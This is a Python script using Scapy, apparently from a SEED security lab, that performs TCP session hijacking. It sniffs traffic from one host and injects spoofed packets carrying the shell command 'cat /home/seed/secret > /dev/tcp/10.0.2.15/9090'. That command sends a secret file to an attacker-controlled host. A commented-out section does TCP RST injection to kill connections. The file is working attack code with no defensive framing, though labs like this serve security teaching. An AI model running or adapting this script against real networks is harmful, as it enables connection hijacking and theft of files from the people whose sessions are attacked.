#!/usr/bin/python3
from scapy.all import *

def spoof_tcp(pkt):
   # print("spoofing")
   # ip  = IP(dst="192.168.64.1", src=pkt['IP'].dst)
   # tcp = TCP(flags="R", seq=pkt['TCP'].ack,
   #                dport=pkt['TCP'].sport, sport=pkt['TCP'].dport)
   # spoofpkt = ip / tcp
   # print("send a RST packet")
   # send(spoofpkt, verbose=0)

   print("SENDING SESSION HIJACKING PACKET.........")
   IPLayer = IP(dst="192.168.64.1", src=pkt['IP'].dst)
   TCPLayer = TCP(sport=pkt['TCP'].sport, dport=pkt['TCP'].dport, flags="A",
                  seq=pkt['TCP'].ack, ack=pkt['TCP'].ack)
   Data = "\r cat /home/seed/secret > /dev/tcp/10.0.2.15/9090\r"
   pkt = IPLayer/TCPLayer/Data
   ls(pkt)
   send(pkt,verbose=0)
print("start sniffing")
#pkt=sniff(filter='tcp and src host 10.9.0.6', prn=spoof_tcp, timeout=60)
pkt=sniff(filter='tcp and src host 192.168.64.1', prn=spoof_tcp, timeout=60)
print(pkt)
print("end sniffing")